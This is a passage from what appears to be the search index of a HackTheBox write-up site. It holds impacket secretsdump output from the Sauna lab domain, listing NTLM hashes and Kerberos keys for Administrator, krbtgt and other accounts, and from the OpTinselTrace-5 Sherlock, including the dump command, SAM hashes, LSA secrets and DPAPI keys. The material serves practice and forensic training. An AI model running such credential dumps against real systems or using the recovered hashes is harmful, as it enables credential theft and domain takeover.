secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::\nEGOTISTICAL-BANK.LOCAL\\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::\nEGOTISTICAL-BANK.LOCAL\\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::\nEGOTISTICAL-BANK.LOCAL\\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::\nSAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:6e6394a08ede375a3212e17608f33464:::\n[*] Kerberos keys grabbed\nAdministrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657\nAdministrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e\nAdministrator:des-cbc-md5:fb8f321c64cea87f\nkrbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24\nkrbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9\nkrbtgt:des-cbc-md5:c170d5dc3edfc1d9\nEGOTISTICAL-BANK.LOCAL\\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324\nEGOTISTICAL-BANK.LOCAL\\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9\nEGOTISTICAL-BANK.LOCAL\\HSmith:des-cbc-md5:1c73b99168d3f8c7\nEGOTISTICAL-BANK.LOCAL\\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2\nEGOTISTICAL-BANK.LOCAL\\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b\nEGOTISTICAL-BANK.LOCAL\\FSmith:des-cbc-md5:b50e02ab0d85f76b\nEGOTISTICAL-BANK.LOCAL\\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba\nEGOTISTICAL-BANK.LOCAL\\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c\nEGOTISTICAL-BANK.LOCAL\\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2\nSAUNA$:aes256-cts-hmac-sha1-96:2ccd8d6f46cc2408808b782884731ee45b8bdec96d08001012bf9df9c4db8a01\nSAUNA$:aes128-cts-hmac-sha1-96:d5cb46ccd859f2e428634530cc7b5eb7\nSAUNA$:des-cbc-md5:104c515b86739e08\n[*] Cleaning up...\n</code></pre></p>"}, {"location": "HackTheBox/Sherlocks/OpTinselTrace-5/", "title": "OpTinselTrace 5", "text": "<pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/C%3A/Windows/System32/config]\n\u2514\u2500$ impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY local -pwd-last-set -user-status -history\nImpacket v0.11.0 - Copyright 2023 Fortra\n\n[*] Target system bootKey: 0x06326087bd0dc6172e31701ef27024d5\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:b473c2b77b3a05800fd7c304fb1f1b37:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n[*] Dumping cached domain logon information (domain/username:hash)\n[*] Dumping LSA Secrets\n[*] $MACHINE.ACC \n$MACHINE.ACC:plain_password_hex:63003000460040005500400057004600210053003c0044005c003a00690056002200220046005f0079002c007700450042003100290053002d006a004a006a004a0025004b0071005a0042003b004c0057005b00350056005b003100440047003f005e00770065005300250069003a0073006d004c0074002b004f0037003e0033002f00450060003d003b0048004e002700540026003400350035002f004d0036005c0052006a00560046005f00350039002d00610046005e0040002f004900550021003c00340064002f002b0063004a00250060006f003000660034002f00200061003600660049002d002b004600\n$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:53da7cc22771a35b151b4bbb3ff143ad\n[*] $MACHINE.ACC_history \n$MACHINE.ACC:plain_password_hex:dfeef9b6828781f822dc49d8cacfe2a6d418196ec18df74070b078fb53ccf4017d61665edd7ddfef12f1a66a9c2ea295e92efe0cd59a5128acef45a00fb837e76b6ad349956dab1af6df16c2024b6eb0e52c74ea8c2e86c77c882bbd611b9fa85ee424968a1a849381d1022a46cd18575ec0d6b8568aeda9a91611beb6357d4b81389f455c26f294b3a8672d1284e7f39efb836f4c8db86dbc0b87ea2a3af3e8d72ec326f800c8e3b0c8328d782563aa88889ada07d8b5dc3efe89f56522a9141e2b66d1db719050e9ebde58ea7aabba80e9ac071ac27695f9cf1832ea6fac953d500de4a954e3a7d07bf919ddd30056\n$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:5998b3332d3591edbea01a7d315ddf2b\n[*] DPAPI_SYSTEM \ndpapi_machinekey:0xed8d2c90415e02e01b3be3d51a81cc1dbaf5f9dd\ndpapi_userkey:0x77b9dde8f1fc0bdfe8c7196832f674f7b36563d1\n[*] DPAPI_SYSTEM_history \ndpapi_machinekey:0xd6701523fcee9c510499273c7d6ed1104ea692cb\ndpapi_userkey:0x1e0cbfd9a7fbaa327565c5b783775fe597e29bda\n[*] NL$KM \n 0000   A8 4F 91 67 0E A4 59 0F  7E 25 B4 A1 0B A8 F8 B3   .O.g..Y.~%......\n 0010   D6 B8 EF AF E2 24 70 D1  43 75 95 F8 37 97 E3 CE   .....$p.Cu..7...\n 0020   7D 43 3F 15 24 C6 C2 29  84 12 51 62 47 7E D6 8D   }C?.$..)..QbG~..\n 0030   19 E5 AA 8B 62 1F 5D 9A  5A 0E BE 39 53 86 8F 3A   ....b.].Z..9S..:\nNL$KM:a84f91670ea4590f7e25b4a10ba8f8b3d6b8efafe22470d1437595f83797e3ce7d433f1524c6c22984125162477ed68d19e5aa8b621f5d9a5a0ebe3953868f3a\n[*] NL$KM_history \n 0000   A8 4F 91 67 0E A4 59 0F  7E 25 B4 A1 0B A8 F8 B3   .O.g..Y.~%......\n 0010   D6 B8 EF AF E2 24 70 D1  43 75 95 F8 37 97 E3 CE   .....$p.Cu..7...\n 0020   7D 43 3F 15 24 C6 C2 29  84 12 51 62 47 7E D6 8D   }C?.$..)..QbG~..\n 0030   19 E5 AA 8B 62 1F 5D 9A  5A 0E BE 39 53 86 8F 3A   ....b.].Z..9S..:\nNL$KM_history:a84f91670ea4590f7e25b4a10ba8f8b3d6b8efafe22470d1437595f83797e3ce7d433f1524c6c22984125162477ed68d19e5aa8b621f5d9a5a0ebe3953868f3a\n[*] Cleaning up...\n</code></pre>"}]}